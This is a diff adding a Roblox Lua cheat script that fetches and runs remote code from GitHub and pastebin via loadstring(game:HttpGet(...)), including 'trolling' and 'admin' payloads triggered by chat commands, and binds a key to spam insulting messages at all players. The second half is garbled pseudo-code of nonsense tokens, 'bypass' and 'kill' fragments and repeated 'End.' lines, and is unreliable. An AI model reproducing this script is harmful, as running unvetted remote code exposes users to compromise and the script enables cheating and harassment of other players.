@@ -1,0 +1,77 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))();
+local Player = game.Players.LocalPlayer
+local TrashTalk = {"UR TRASH KID", "L", "EZ", "GET SLAPPED", "HOW DID YOU LOSE", "WYD? LOL", "Smh", "too bad", "ROFL", "F", "YOU'RE GARBAGE", "GET CLAPPED", "So Bad", "tbh this is a waste of time", "ur so dog", "cry", "cry about it", "bozo", "go practice", "bro just quit already", "can I get an ss? oh wait ur ded!"}
+local Mouse = Player:GetMouse()
+local Cooldown = 0.5
+local CooldownWaited = 0
+ 
+local Key = "h"
+ 
+function TalkTrash(k)
+    if k == Key and CooldownWaited == 0 then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(TrashTalk[math.random(1,#TrashTalk)], "All")
+        CooldownWaited = Cooldown
+        
+        repeat wait(Cooldown) CooldownWaited = 0 until CooldownWaited == 0
+    end
+end
+ 
+Mouse.KeyDown:Connect(TalkTrash);
+local Player = game.Players.LocalPlayer
+ 
+Player.Chatted:connect(function(cht)
+	if cht:match(":trollinggui") then
+		loadstring(game:HttpGet("https://pastebin.com/raw/RNWgaqCE", true))() -- make sure you add in the script too
+	elseif cht:match(":admin") then -- add what you want to say for the script to execute so i put "admin" because i want it to load an admin script
+		loadstring(game:HttpGet("https://pastebin.com/raw/iM2Hhq68", true))()
+	end
+end)
+ 
+-- now we're going to add a simple script that lets us know when the script is working
+ 
+game:GetService("StarterGui"):SetCore("SendNotification",{
+    Title = "Loaded Admin";
+    Text = "Working!";
+});
+loadstring.game.argbypassell.backpackguiCctrnls.cyrlfpeluac8
+End
+ End
+  End
+N.void = True , False , 0.1
+GOTO.TextScaledplayerGOTO.BackgroundTransparency
+Else { }
+ Altplayer.thoughv,Amish.Childrenworkspace
+Chat.bubblehub(nab/ ;kill !slash
+End.
+ End.
+  End.
+Example script for da hood= 
+ [🔥]!Username
+ [🥶]!Username
+ [💀]!Username
+ [😐]!Username
+ [🤡]!Username
+ [❤️]!Username
+ [⚠️]!Username
+ [👑]!Username
+ [⭐]!Username
+ [🔥]!Username
+ [💀]!Username
+ [🛡️]!Username
+.Ctrlworkspace.tpalltool.size bubble.chat = 8.1
+Black.vgui.Jasm82 .Childrentoilsearned .shrmsip
+.chatmassagebiggui!worked .v ,c .antibypassantilogrr
+.Ctrl = true ,
+.arg = true ,
+.alt = false ,
+.ppartgameworkproleyer.autoplayer 
+End.
+ End.
+  End.
+storage.objects.getCctrnls.cyrlfpeluac<Error>
+<Code>Access
+Message,.loadstring \{} {}{} .killgui . transp = .01
+Else {  }  , get objects =  On = 0 ,9 .xCqnson.loads
+End. 
+ End.
+  End. Free.VvNarename.nigjmare.loadstringworkspace.Children = 7 humanoid = 2. localchildren. Arg.Alt=clone 2 nji=2 partbypassed.!=7 part =2 humanoid = 9 local2.Pairs2.Backpack(load.)
